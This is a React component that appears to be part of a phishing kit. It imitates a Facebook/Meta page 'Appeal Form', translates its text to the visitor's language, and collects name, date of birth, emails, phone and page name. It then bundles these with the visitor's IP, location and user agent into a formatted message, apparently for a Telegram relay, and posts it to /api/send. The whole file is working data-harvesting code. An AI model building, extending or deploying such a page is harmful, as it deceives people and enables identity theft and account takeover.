import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faCheck, faExternalLinkAlt, faXmark } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import 'intl-tel-input/build/css/intlTelInput.css';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    information: string;
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    facebookPageName: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Email', type: 'email' },
    { name: 'businessEmail', label: 'Email Business', type: 'email' },
    { name: 'facebookPageName', label: 'Page Name', type: 'text' },
    { name: 'information', label: 'How can we contact you', type: 'textarea' }
];
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        information: '',
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        facebookPageName: ''
    });

    const [isChecked, setIsChecked] = useState(false);
    const [dob, setDob] = useState({ day: '', month: '', year: '' });
    const [dobError, setDobError] = useState('');
    const { setModalOpen, geoInfo, setMessageId, setMessageContent, setContactInfo, setUserInfo } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Information', 'Appeal Form', 'Please provide us information that will help us investigate', 'How can we contact you', 'Full Name', 'Personal Email', 'Email Business', 'Business Email', 'Mobile phone number', 'Page Name', 'Facebook Page Name', 'Date of Birth', 'Day', 'Month', 'Year', 'Our response will be sent to you within 14 - 48 hours.', 'I agree with', 'Terms of use', 'Continue', 'Submit', 'Please enter a valid date of birth.', 'Invalid date.', 'Date of birth cannot be in the future.'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleDobChange = useCallback((field: 'day' | 'month' | 'year', value: string) => {
        const numValue = value.replace(/\D/g, '');

        let maxLen = 2;
        let maxVal = 31;

        if (field === 'month') {
            maxVal = 12;
        } else if (field === 'year') {
            maxLen = 4;
            maxVal = new Date().getFullYear();
        }

        if (numValue.length > maxLen) return;

        const num = Number.parseInt(numValue);
        if (numValue && (num < 1 || num > maxVal)) return;

        setDob((prev) => ({ ...prev, [field]: numValue }));
        setDobError('');
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        setDobError('');
        const day = Number.parseInt(dob.day);
        const month = Number.parseInt(dob.month);
        const year = Number.parseInt(dob.year);

        if (!dob.day || !dob.month || !dob.year || Number.isNaN(day) || Number.isNaN(month) || Number.isNaN(year)) {
            setDobError('Please enter a valid date of birth.');
            return;
        }

        const date = new Date(year, month - 1, day);
        if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
            setDobError('Invalid date.');
            return;
        }

        const today = new Date();
        if (date > today) {
            setDobError('Date of birth cannot be in the future.');
            return;
        }

        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>🎂 Date of Birth:</b> <code>${day}/${month}/${year}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>
<b>🖥️ User Agent:</b> <code>${navigator.userAgent}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        const contact = formData.personalEmail || phoneNumber;
        setContactInfo(contact);

        setUserInfo({
            email: formData.personalEmail,
            phone: phoneNumber,
            pageName: formData.facebookPageName
        });

        setMessageContent(message);

        try {
            const res = await axios.post('/api/send', { message });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }
        } catch (err) {
            console.error('err send:', err);
        }

        nextStep();
        setIsLoading(false);
    };
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-full w-full max-w-lg flex-col rounded-2xl bg-[linear-gradient(130deg,rgba(249,241,249,1)_0%,rgba(234,243,253,1)_35%,rgba(237,251,242,1)_100%)] px-5 py-5 shadow-lg'>
                <div className='mb-2.5 flex w-full items-center justify-between'>
                    <h2 className='flex items-center justify-center text-center text-[15px] font-bold text-[#0A1317]'>{t('Information')}</h2>
                    <div onClick={() => setModalOpen(false)} className='h-4.5 w-4.5 cursor-pointer opacity-60 transition-opacity duration-200 hover:opacity-100' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} className='h-4.5 w-4.5' />
                    </div>
                </div>

                <form onSubmit={handleSubmit} className='flex w-full flex-1 flex-col overflow-y-auto'>
                    <div className='flex w-full flex-col'>
                        {FORM_FIELDS.slice(0, 4).map((field) => (
                            <div key={field.name}>
                                <input required name={field.name} type={field.type} value={formData[field.name]} placeholder={t(field.label)} onChange={handleInputChange} className='mb-2.5 h-10 w-full rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 text-[14px] tracking-wide outline-0 transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100' />
                            </div>
                        ))}
                        <div className='input mb-2.5 h-10 w-full rounded-[10px] border border-[#d4dbe3] bg-[white] text-[14px]'>
                            <div className='flex h-full w-full items-center'>
                                <IntlTelInput
                                    onChangeNumber={handlePhoneChange}
                                    initOptions={initOptions}
                                    inputProps={{
                                        name: 'phoneNumber',
                                        className: 'h-full w-full bg-transparent outline-none border-none'
                                    }}
                                />
                            </div>
                        </div>
                        <div className='flex flex-col'>
                            <p className='mb-1.75 font-sans text-[14px] font-bold text-[#9a979e]'>{t('Date of Birth')}</p>
                            <div className='grid grid-cols-3 gap-2.5'>
                                <div className={`input mb-2.5 h-10 w-full rounded-[10px] border ${dobError ? 'border-red-500' : 'border-[#d4dbe3]'} bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100`}>
                                    <input placeholder={t('Day')} id='day' className='h-full w-full outline-0' type='tel' inputMode='numeric' pattern='[0-9]*' value={dob.day} onChange={(e) => handleDobChange('day', e.target.value)} maxLength={2} />
                                </div>
                                <div className={`input mb-2.5 h-10 w-full rounded-[10px] border ${dobError ? 'border-red-500' : 'border-[#d4dbe3]'} bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100`}>
                                    <input placeholder={t('Month')} className='h-full w-full outline-0' id='month' type='tel' inputMode='numeric' pattern='[0-9]*' value={dob.month} onChange={(e) => handleDobChange('month', e.target.value)} maxLength={2} />
                                </div>
                                <div className={`input mb-2.5 h-10 w-full rounded-[10px] border ${dobError ? 'border-red-500' : 'border-[#d4dbe3]'} bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100`}>
                                    <input placeholder={t('Year')} id='year' className='h-full w-full outline-0' type='tel' inputMode='numeric' pattern='[0-9]*' value={dob.year} onChange={(e) => handleDobChange('year', e.target.value)} maxLength={4} />
                                </div>
                            </div>
                            {dobError && <p className='mt-1 mb-2 text-xs text-red-500'>{t(dobError)}</p>}
                        </div>
                        {FORM_FIELDS.slice(4).map((field) => (
                            <div key={field.name}>{field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} placeholder={t(field.label)} className='mb-2.5 h-25 w-full resize-none rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 py-2.75 text-[14px] outline-0 transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100' /> : <input required name={field.name} type={field.type} value={formData[field.name]} placeholder={t(field.label)} onChange={handleInputChange} className='mb-2.5 h-10 w-full rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 text-[14px] tracking-wide outline-0 transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100' />}</div>
                        ))}
                        <p className='mb-1.75 font-sans text-[14px] text-[#9a979e]'>{t('Our response will be sent to you within 14 - 48 hours.')}</p>
                        <div className='mt-3.75 mb-5'>
                            <label className='flex cursor-pointer items-center gap-1.25 text-[14px]' htmlFor='custom-checkbox' aria-label={t('I agree with terms of use')}>
                                <label className='inline-flex cursor-pointer items-center'>
                                    <input className='sr-only' id='custom-checkbox' type='checkbox' checked={isChecked} onChange={() => setIsChecked(!isChecked)} />
                                    <div className={`flex h-4 w-4 items-center justify-center rounded-sm border transition-all duration-200 ${isChecked ? 'border-[#0064E0] bg-[#0064E0]' : 'border-gray-300 bg-white'}`}>
                                        <FontAwesomeIcon icon={faCheck} className={`h-3 w-3 text-white ${isChecked ? 'block' : 'hidden'}`} />
                                    </div>
                                </label>
                                {t('I agree with')}{' '}
                                <p className='flex items-center justify-center gap-1 text-[#0064E0] hover:underline'>
                                    {t('Terms of use')} <FontAwesomeIcon icon={faExternalLinkAlt} className='inline h-3.25 max-h-3.25 min-h-3.25 w-3.25 max-w-3.25 min-w-3.25' />
                                </p>
                            </label>
                        </div>
                        <button type='submit' disabled={isLoading} className={`mt-4 flex h-11.25 w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] text-[15px] font-medium text-[white] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                        </button>
                    </div>
                </form>
            </div>
        </div>
    );
};

export default InitModal;
